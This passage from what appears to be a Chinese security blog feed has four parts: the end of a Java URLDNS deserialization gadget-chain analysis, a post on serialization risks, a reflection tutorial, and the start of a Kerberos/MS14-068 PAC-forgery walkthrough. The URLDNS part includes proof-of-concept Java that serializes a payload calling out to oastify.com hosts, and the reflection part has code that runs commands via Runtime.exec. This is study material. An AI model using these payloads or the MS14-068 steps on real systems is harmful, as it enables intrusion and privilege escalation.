class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​而URL的hashCode会对传入的url发起解析请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">InetAddress addr = getHostAddress(u);</span><br><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line"></span><br><span class="line">    // Generate the protocol part.</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the host part.</span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    if (addr != null) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        if (host != null)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Generate the file part.</span><br><span class="line">    String file = u.getFile();</span><br><span class="line">    if (file != null)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the port part.</span><br><span class="line">    if (u.getPort() == -1)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    else</span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    // Generate the ref part.</span><br><span class="line">    String ref = u.getRef();</span><br><span class="line">    if (ref != null)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    return h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<strong>因此只要我们HashMap调用的put方法的第一个参数是URL，也就是key是URL，就会发起解析请求。</strong></p><h1 id="生成反序列化POC"><a href="#生成反序列化POC" class="headerlink" title="生成反序列化POC"></a>生成反序列化POC</h1><p>尝试生成反序列化的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;URLDNS.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3qumzpevco577heiskddfxinrex4lt.oastify.com&quot;</span>),<span class="number">1</span>);</span><br><span class="line">        serializeTest.serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hashMap.put会调用一次URL解析的请求，这就会导致我们在检测的时候混淆，这个请求是漏洞发起的还是生成POC的时候发起的，这不是我们想要的结果。</p><p>分析不难发现，URL的hashCode方法中存在判断hashCode是否为-1，如果不是直接返回就不会继续调用handler.hashCode方法。那如果我们在生成URL对象的时候改变其hashCode的属性为-1即可避免生成POC的请求，此时我们就可以使用反射将修改已有对象的属性值。因此main中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://oskfkh6gs1dftwbwfi4fw2x85zbpze.oastify.com&quot;</span>);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> URL.class; <span class="comment">// 获取URL类原型</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">urlField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// 获取URL类的变量</span></span><br><span class="line">    urlField.setAccessible(<span class="literal">true</span>);<span class="comment">//  设置可修改权限，因为hashCode为私有变量</span></span><br><span class="line">    urlField.set(url,<span class="number">1234</span>); <span class="comment">//修改url对象的属性值。</span></span><br><span class="line">    hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">    urlField.set(url,-<span class="number">1</span>); <span class="comment">// 修改成-1。</span></span><br><span class="line">    serializeTest.serialize(hashMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，发现不会发起url解析请求。然后我们将URLDNS.bin进行反序列化。就可以发起url请求了。</p><p>我们就可利用生成的URLDNS.bin发送给反序列化的接口，如果出现了解析请求就说明，目标接口将URLDNS.bin进行了反序列化，即可证明存在反序列化漏洞。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>HashMap重写了readObject方法，并且该方法调用了putVal进而调用hash，而hash对其key值进行了hashCode。这就会导致当序列化一个HashMap集合时，会调用其key值的hashCode方法，而URL的HashCode方法会调用handler.hashCode进而调用getHostAddress对其URL进行解析请求。</p><p>整条链分析下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java序列化与反序列化</title>
      <link href="/2023/03/20/java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/20/java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​<strong>java序列化</strong>是指将java<strong>对象</strong>转化成字节序列的过程；</p><p>​<strong>java反序列化</strong>是指将字节序列转换成java对象的过程；</p><h2 id="序列化反序列化场景"><a href="#序列化反序列化场景" class="headerlink" title="序列化反序列化场景"></a>序列化反序列化场景</h2><p>序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p><p>① 想把内存中的对象保存到一个文件中或者数据库中时候；<br>    ② 想用套接字在网络上传送对象的时候；<br>    ③ 想通过RMI传输对象的时候 ；</p><h2 id="常见的序列化和反序列化协议"><a href="#常见的序列化和反序列化协议" class="headerlink" title="常见的序列化和反序列化协议"></a>常见的序列化和反序列化协议</h2><p>XML&amp;SOAP</p><p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p><p>JSON（Javascript Object Notation）</p><p>Protobuf</p><h2 id="序列化和反序列化的实现"><a href="#序列化和反序列化的实现" class="headerlink" title="序列化和反序列化的实现"></a>序列化和反序列化的实现</h2><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）。</p><h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><p>服务端的代理逻辑能够反序列化数据，会导致客户端传递类的readObject中代码会自动执行，导致攻击者能够在服务器上运行代码的能力。</p><h2 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h2><p>1、目标服务器接受序列化的数据，并将其反序列化。（此刻已具备目标服务器上的方法的任意调用）</p><p>2、存在合适的危险方法执行链。（实现攻击）</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>1、入口类的readObject直接调用危险的方法。（基本上不会出现）</p><p>2、入口类参数中包含可控类，该类有危险的方法，readObject时调用。</p><p>3、入口类参数中包含可控类，该类又调用其他有危险方法的类，readIObject时调用。</p><p>4、够赞函数&#x2F;静态代码块等类加载时隐式执行。</p><h2 id="查找利用点"><a href="#查找利用点" class="headerlink" title="查找利用点"></a>查找利用点</h2><p>1、反序列化的类必须实现Serializable或者Externalizable接口。（否则，无法将类序列化成字节流也无法进行反序列化，java会抛出异常）。</p><p>2、最终的反序列化的入口类的readObject方法调用了危险类，或者间接调用危险类。</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是反射？"><a href="#什么是反射？" class="headerlink" title="什么是反射？"></a>什么是反射？</h1><p>​反射我简单的理解为：“<strong>动态注册</strong>”，java支持反射功能。比如：一段代码在你不知道传入的参数值是什么的时候，也就无法知道它有什么用处：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这段代码中包含这几个关键的函数：</p><p>​<strong>获取类的⽅法： forName</strong> </p><p>​<strong>实例化类对象的⽅法：</strong> <strong>newInstance</strong> </p><p>​<strong>获取函数的⽅法：</strong> <strong>getMethod</strong> </p><p>​<strong>执⾏函数的⽅法： invoke</strong></p><p>​这段代码也就很容易理解：传入类名和方法名，通过Class.forName获取到类，通过getMethod获 取传入的类的方法，通过invoke调用这个方法，而clazz.newInstance()就是对前边获取到的类进行初始化（也就是new）。</p><h2 id="举一个例子"><a href="#举一个例子" class="headerlink" title="举一个例子"></a>举一个例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String classname,String MethodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">t</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;<span class="comment">//实例化一个String对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(classname);<span class="comment">//传入类</span></span><br><span class="line">        System.out.println(c.getMethod(MethodName).invoke(t));<span class="comment">//调用类方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        demo1.exec(<span class="string">&quot;java.lang.String&quot;</span>,<span class="string">&quot;length&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># forName 获取类的⽅法</span><br><span class="line"># getMethod 获取函数的⽅法</span><br><span class="line"># invoke 执⾏函数的⽅法</span><br><span class="line"># newInstance 实例化类对象的⽅法，效果类似于<span class="keyword">new</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%8F%8D%E5%B0%84/202303201113259.png" alt="image.png"></p><h1 id="反射有什么用？"><a href="#反射有什么用？" class="headerlink" title="反射有什么用？"></a>反射有什么用？</h1><p>​通过java语言中的反射机制可以操作字节码文件（可以读和修改字节码文件。）</p><p>​什么意思呢？大致意思就是我们能够通过反射去修改一个已有类的属性，调用类的任何方法！</p><h2 id="一些反射常用的方法"><a href="#一些反射常用的方法" class="headerlink" title="一些反射常用的方法"></a>一些反射常用的方法</h2><p>​在实现反射修改任意已有类的属性之前我们需要先学习一下反射技术中常用的一些方法。</p><p>​1、获取到类，除了前边给出的Class.forName获取类，还有一些常用的方法：</p><ul><li>obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类。</li></ul><ul><li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。</li></ul><p>​2、获取一个类的Field属性值，即一个类的成员变量，包括私有、公有、保护。</p><ul><li><code>Class#getField(String name)</code>传入属性名称，获取到类的该属性。</li><li><code>Class#getDeclaredField(String name)</code>同上，不同点是getDeclaredField能获取一个类的所有属性，而getField只可获取公有属性值。</li><li><code>Class#getFields()</code>可想而知是获取到类的全部公有属性值。</li><li><code>Class#getDeclaredFields()</code>这是获取类的全部属性值包括公有、私有、保护。</li></ul><p>​3、获取一个类的Method方法，即一个类的方法，包括私有、公有、保护。</p><ul><li>获取Method和获取Field类似，前缀getDeclared即是获取公有、私有、保护方法，后缀s即是获取所有方法，不做过多的说明。</li></ul><p>​4、获取一个类的Constructor构造函数，同样的也和Field类似。</p><p>​5、获取并修改一个类，这类方法不属于Class类的方法了，而是Field、Method等这些类的方法。</p><ul><li>set，给一个类的某个属性赋值。</li><li>get，获取某个类的属性，</li><li>setAccessible，设置私有属性可访问。</li></ul><p>​6、还有一些常用的方法，getDeclaredAnnotation获取注解，getName获取类名，getInterfaces获取接口等等。</p><h2 id="实例修改一个已有类"><a href="#实例修改一个已有类" class="headerlink" title="实例修改一个已有类"></a>实例修改一个已有类</h2><p>​掌握上边的知识以后，就可以尝试对一个已有的类通过反射去修改类的属性，调用类的任何方法！</p><p>​尝试对Runtime类进行修改：</p><p>​首先需要了解Runtime类，它的构造方法是private私有的，无法直接new Runtiem()，但是内部存在这样的一个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br></pre></td></tr></table></figure><p>​通过该方法可以获取到一个new Runtime()。这是java中的单例模式。</p><p>​实践1：调用Runtime的私有构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.class; <span class="comment">// 获取到类</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">RuntimeDeclaredConstructor</span> <span class="operator">=</span> runtime.getDeclaredConstructor(); <span class="comment">// 获取无参构造函数</span></span><br><span class="line">        RuntimeDeclaredConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置可访问，因为该构造函数为私有属性</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) RuntimeDeclaredConstructor.newInstance();<span class="comment">// 实例化</span></span><br><span class="line">        r.exec(<span class="string">&quot;calc&quot;</span>);<span class="comment">// 调用方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%8F%8D%E5%B0%84/202303201437131.png" alt="image-20230320143737940"></p><p>​实践2：反射修改ProcessBuilder类中的私有属性参数command</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ProcessBuilder.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">cmd</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;command&quot;</span>);</span><br><span class="line">        cmd.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        cmdList.add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        cmd.set(p,cmdList);</span><br><span class="line">        p.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个例子可能没什么实质性用处，我们只需要知道我们能够通过反射来修改一个类的已有属性值即可。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%8F%8D%E5%B0%84/202303201458713.png" alt="image-20230320145804008"></p><h1 id="反射在反序列化漏洞中的应用"><a href="#反射在反序列化漏洞中的应用" class="headerlink" title="反射在反序列化漏洞中的应用"></a>反射在反序列化漏洞中的应用</h1><p>​因为发射使java具有动态性，因此我们可以通过反射技术做到以下：</p><p>​1、修改已有对象的属性。</p><p>​2、动态生成对象。</p><p>​3、动态调用方法。</p><p>​4、操作内部类和私有方法。</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kerberos网络身份认证-PTT-ms14068</title>
      <link href="/2022/11/17/kerberos%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-PTT-ms14068/"/>
      <url>/2022/11/17/kerberos%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-PTT-ms14068/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前边"><a href="#写在前边" class="headerlink" title="写在前边"></a>写在前边</h2><p>Windows 横向渗透的两种方式。</p><p>1、<strong>hash传递攻击</strong>，通过传递NTLM-Hash，登录机器，简称PTH； </p><p>2、<strong>ticket传递攻击</strong>，通过传递kerberos的ticket，登录机器，简称PTT； </p><p>这一篇聊一下kerberos协议和PTT攻击。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windwos平台下目前主要的网络身份认证协议有：NTLM身份认证、kerberos身份认证。 在互不信任的网络中，Kerberos是一种可靠的中心化认证协议，可以用于防窃听、防止重放攻击、保护数据完整性等场合，是一种应用对称密钥体制进行密钥管理的系统。</p><p>kerberos协议中也存在三个角色，分别是：</p><ul><li>客户端（client）：发送请求的一方。</li><li>服务端（Server）：接收请求的一方。</li><li>密钥分发中心（Key Distribution Center，KDC）：负责票据生成和分发的可信任第三方。</li></ul><p>而密钥分发中心KDC一般又分为两部分，分别是：</p><ul><li>AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）。</li><li>TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）。</li></ul><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>简化的Kerberos认证流程可以分为两步。</p><ul><li>第一步，客户端向KDC请求获得他想要访问的服务的服务授予票据（可以想象成去动物园，想去买一张能够进入动物园的门票）。</li><li>第二步，拿着这张服务授予票据（Ticket）去访问服务端的服务。</li></ul><p><strong>此时就会出现两个问题</strong>。</p><ul><li><strong>问题1</strong>. KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</li><li><strong>问题2</strong>. 服务端怎么知道你带来的服务授予票据（Ticket）就是一张真正的票据呢？</li></ul><p><strong>交互流程</strong><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304847.png" alt="img"></p><p>对于刚才提到的问题kerberos给出了答案。</p><p>Kerberos协议的完整流程上图所示共分为三步6小步：</p><p><strong>Client与 AS的交互：1.AS_REQ 2. AS_REP。为了验证客户端的身份合法性</strong>。</p><p>1、AS_REQ是Client发给AS的请求，这一步的目的是AS确认客户不是伪造的客户。</p><p>内容：AS_REQ&#x3D;[pc,ps,IP_list，Authenticator] ,发送client的一些信息，和加密的时间戳。Authenticator&#x3D;enc(TimeStamp)。</p><p>AS收到AS_REQ后如何确认客户端没有伪造呢？</p><p>(1)、AS可以解密Authenticator。</p><p>(2)、TimeNow-TimeStamp&lt;5MIN。</p><p>2、AS_REP是AS给client的响应。</p><p> AS对用户的hash进行解密，如果解密正确，AS就会返回用KDC内部用户krbtgt的NTLM-hash加密的TGT票据。TGT中包含PAC（特权属证书），PAC包含client的相关权限信息，如SID所在的组。简单理解PAC用户验证用户权限，只有KDC能够制作和查看PAC。</p><p>这一步的目的有两个:</p><p>(1).AS给合法用户颁发TGT。</p><p>(2).AS给合法用户提供与TGS通信的session_key。</p><p><strong>Client与TGS的交互：3.TGS_REQ 4. TGS_REP。为了获取目标服务的票据</strong>。</p><p>3、TGS_REQ是client给TGS的请求，这一步的目的只有一个:Client 向TGS请求服务票据Ticket。</p><p>client凭借TGT向TGS发起针对需要访问服务的请求。TGS在收到客户端发的TGS_REQ后如何确认TGT不是伪造呢？</p><p>(1).TGS可以解密dec(TGT)key&#x3D; hash_krbtgt, 从而得到SK,解密正确，说明票据是真实的。</p><p>(2).TGT&#x3D;enc(pc,ps,ip_list,TimeStamp,timelife,SK) key&#x3D;hash_krbtgt利用SK解密Authenticator，得到pc2，比较pc1与pc2。</p><p>(3).TimeNow – TimeStamp（TGT）&lt; timelife 8 小时。</p><p>4、TGS_REP是TGS给client的应答，这一步的目的只有有一个:TGS 向client发送服务票据Ticket。</p><p>TGS使用krbtgt的NTLM hash对TGT进行解密，如果正确，就返回服务NTLM hash加密的TGS票据（简称ST）,并带上PAC。注意：在kerberos认证过程中，无论用户有没有访问服务的权限，只要TGT正确就会返回ST。</p><p>client在收到TGS发的TGS_REP后如何确认TGS数据包不是伪造呢？</p><p>(1).client可以解密dec(ps,SSK,TimeStamp, timelife)key&#x3D; SK, </p><p>(2).TimeNow – TimeStamp&lt; timelifet</p><p>Client 通过TGS_REP 获得了 Ticket 和 与 AP server 通信的会话密钥SSK</p><p><strong>Client与AP的交互：5.AP_REQ 6.AP_REP 为了验证票据的正确性。</strong></p><p>5、AP_REQ是client给服务的请求，这一步的目的是让服务验证client的合法性。</p><p>之后的两步就是client向服务请求。服务在收到client发的AP_REQ后如何验证client的合法性呢？</p><p>(1).A服务可以解密Ticket, Ticket &#x3D;enc(pc1,SSK,TimeStamp, timelife) key&#x3D;srver_hash。</p><p>(2).利用SSK解密Authenticator,比较pc1和pc2。</p><p>(3).验证时间戳。</p><p>6、AP_REP是服务给client的请求，这一步的目的是告知client验证 成功与否。</p><p>服务使用自己的NYLM hash去解密ST，如果解密正确，就会将其中的PAC给KDC解密，KDC由此判断client是否有访问服务的权限。注意：如果没有开启PAC就不会去向KDC求证。</p><p><strong>场景：</strong></p><p>小王是EBI在职员工，EBI有许多部门组织，例如：情报组（server）。小王要去情报组翻阅资料需要如下步骤（没有设置PAC）：</p><p>小王（client）提供自己的姓名和口令给认证系统（AS）。认证系统根据系统内小王用户的密码进行解密，发现信息正确，然后用门禁系统（KDC）的特殊密码（krbtgt的NTLM hash），将小王的信息加密后，打印出小王的凭证（TGT）。然后小王将凭证交给前台（TGS），并提供出自己要去情报组，前台扫描凭证（用krbtgt的NTLM hash解密）后。发现信息正确后将对应门禁卡（ST）交给小王，小王凭借门禁卡进入情报组找到自己想要的资料。</p><p>这过程之中也存在问题：</p><p>1、krbtgt的NTLM hash泄露。我们就可以任意伪造凭证去任何组织。（黄金票据）</p><p>2、在没有设置PAC的情况下，只要提供正确的门禁卡是可以任意进入的。（白银票据）</p><p>补充一下： 只有KDC能制作和查看PAC。如果设置了PAC就会多出一个步骤，即在小王使用对应门禁卡的时候情报组会去向门禁系统验证PAC是否正确。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p><strong>环境</strong></p><p>域控 winserver2012 192.168.50.143</p><p>域成员 win7 192.168.50.138</p><h3 id="ms14-068伪造PAC"><a href="#ms14-068伪造PAC" class="headerlink" title="ms14-068伪造PAC"></a>ms14-068伪造PAC</h3><p>​      ms14-068漏洞主要通过伪造PAC，将普通用户权限提权为域管权限，以此来控制域控。只要服务器未打ms14-068补丁（KB3011780），在server 2000以上的域控服务器中，都可进行利用。</p><p><strong>利用条件</strong></p><p>1、获取域普通用户的账号密码。</p><p>2、获取域普通用户的sid。</p><p>3、服务器未打KB3011780补丁。</p><h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>1、查看当前系统补丁</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo | findstr KB3011780</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304188.png" alt="img"></p><p>2、查看alex的sid（alex为域用户普通权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /user</span><br></pre></td></tr></table></figure><p><img 